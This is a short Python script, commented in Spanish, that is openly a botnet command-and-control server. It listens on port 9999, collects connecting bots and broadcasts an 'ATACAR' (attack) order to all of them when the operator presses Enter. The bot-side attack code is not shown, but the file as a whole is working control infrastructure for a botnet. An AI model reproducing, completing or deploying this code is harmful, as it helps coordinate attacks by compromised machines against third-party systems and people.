import socket
import threading

HOST = '0.0.0.0' # Escucha en todas las IPs
PORT = 9999
lista_bots = []
print(f"--- Servidor C&C Iniciado en {HOST}:{PORT} ---")
print("Esperando conexiones de bots...")

def handle_bot(conn, addr):
    """Maneja la conexión de un bot."""
    print(f"[+] Nuevo Bot Conectado: {addr}")
    lista_bots.append(conn)

def wait_for_connections(s):
    """Acepta conexiones entrantes de bots."""
    while True:
        try:
            conn, addr = s.accept()
            # Lanza un hilo para manejar el bot
            # (daemon=True para que se cierre si el script principal muere)
            threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
        except:
            print("Error aceptando conexiones.")

# --- Hilo principal del C&C ---
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5) # Hasta 5 conexiones en cola

# Iniciar el hilo que acepta bots
threading.Thread(target=wait_for_connections, args=(s,), daemon=True).start()

while True:
    cmd = input(f"\nComando (bots={len(lista_bots)}) (presiona ENTER para ATACAR): ")
    if cmd == "":
        if not lista_bots:
            print("¡No hay bots conectados!")
            continue
            
        print(f"Enviando orden de ATACAR a {len(lista_bots)} bot(s)...")
        for conn in lista_bots:
            try:
                # Envía la orden
                conn.sendall(b'ATACAR')
            except Exception as e:
                print(f"Error enviando a un bot: {e}")
                lista_bots.remove(conn)
